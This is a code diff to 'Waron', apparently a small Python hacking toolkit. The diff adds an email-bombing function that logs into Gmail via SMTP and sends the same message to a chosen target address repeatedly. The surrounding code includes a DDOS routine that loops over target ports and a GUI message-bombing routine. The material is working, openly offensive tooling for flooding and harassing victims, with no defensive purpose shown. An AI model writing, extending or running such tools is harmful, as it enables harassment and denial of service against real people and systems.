@@ -4,6 +4,7 @@ import os
 import random
 import string
 import pyautogui
+import smtplib
 from time import sleep
 
 #Banner Area
@@ -16,7 +17,7 @@ banner = '''
    ████████████▀  ▄▄▄ ▀████████████
   ████████████   ████▌  ████████████     Author   : Md. Ridwanul Islam Muntakim
   █████▄    █   ██████   █    ▄█████▌    Tool Name: Waron
- ████████   ▌   █▀  ▀█   █   ████████    Version  : 0.01
+ ████████   ▌   █▀  ▀█   █   ████████    Version  : 0.02
  █████████  ▌   ▌ ██▄       █████████    We Are The Greatest Fear Of Our Enemies
  ██████████▄█   ██████     ██████████    
  ▐███████████▌  ██████  ▄▄██████████
@@ -36,16 +37,16 @@ password = input("Enter Password: \nuser@waron:~# ")
 
 #Functions
 def runsupportbot():
-    usage = ("DDOS Example: \n------------- \nTarget IP Address: 127.0.0.1 \nTarget Port Number: 80 \n \nBombing Example: \n---------------- \nBombing Numbers: 500 \nBombing Text: Waron is here \n \nText Repeat Example: \n-------------------- \nRepeat Numbers: 100 \nRepeat Text: Waron is here \n \nStrong Password Generate Example: \n---------------------------------\nPassword Lenght: 100")
+    usage = ("DDOS Example: \n------------- \nTarget IP Address: 127.0.0.1 \nTarget Port Number: 80 \n \nBombing Example: \n---------------- \nBombing Numbers: 500 \nBombing Text: Waron is here \n \nEmail Bombing Example: \n---------------------- \nYour Gmail Address: name@gmail.com \nYour Gmail Address Password: Hello Password \nTarget Email Address: name@anything.com \nAttcker Message: Waron is here \nNumber Of Emails: 100 \n \nText Repeat Example: \n-------------------- \nRepeat Numbers: 100 \nRepeat Text: Waron is here \n \nStrong Password Generate Example: \n---------------------------------\nPassword Lenght: 100")
     print(usage)
     sys.exit()
 
 def warontoolsname():
     print("[i] Select Tool:")
     print("-"*16)
-    tools = ["[1] DDOS Attack", "[2] Bombing", "[3] Text Repeat", "[4] Strong Password Generate"]
+    tools = ["[1] DDOS Attack", "[2] GUI Bombing", "[3] Email Bombing", "[4] Text Repeat", "[5] Strong Password Generate"]
     index = 0
-    lenght = 4
+    lenght = 5
     while index < lenght:
         print(tools[index])
         index = index + 1
@@ -63,7 +64,7 @@ def runwaronddos():
         if targetportnumber == 65534:            
             targetportnumber = 1
 
-def runwaronbomb():
+def runwaronguibombing():
     bomb = 1
     numberofbomb = int(input("Number Of Bomb: \nuser@waron:~# "))
     bombtext = input("Enter Bomb Text: \nuser@waron:~# ")
@@ -112,6 +113,22 @@ def runwaronpasswordgenerate():
     passwordsjoined = "".join(passwordlist[:passwordlenght])
     print(f"Your Password: {passwordsjoined}")
 
+def runwaronemailbombing():
+    attackeremailaddress = input("Enter Your Gmail Address: \nuser@waron:~# ")
+    attackerpassword = input("Enter Your Gmail Address Password: \nuser@waron:~# ")
+    targetemailaddress = input("Enter Target Email Address: \nuser@waron:~# ")
+    attackermessage = input("Attacker Message: \nuser@waron:~# ")
+    numberofemails = int(input("Number Of Emails: \nuser@waron:~# "))
+    emailserver = smtplib.SMTP("smtp.gmail.com",587)
+    emailserver.starttls()
+    emailserver.login(attackeremailaddress,attackerpassword)
+    sentemail = 1
+    while sentemail <= numberofemails:
+        emailserver.sendmail(attackeremailaddress,targetemailaddress,attackermessage)
+        print(f"Successfully {sentemail} email sent to {targetemailaddress}")
+        sentemail = sentemail + 1
+    emailserver.quit() 
+
 #Control Details
 if waronusername == username and waronpassword == password:
     print("Login Successfully")
@@ -127,11 +144,13 @@ if waronusername == username and waronpassword == password:
         if selectiontool == 1:
             runwaronddos()
         elif selectiontool == 2:
-            runwaronbomb()
+            runwaronguibombing()
         elif selectiontool == 3:
-            runwarontextrepeat()
+            runwaronemailbombing()
         elif selectiontool == 4:
-            runwaronpasswordgenerate()  
+            runwarontextrepeat()
+        elif selectiontool == 5:
+            runwaronpasswordgenerate()   
         else:
             print("\033[0;31m[x] Wrong Tool Selection")
     else:
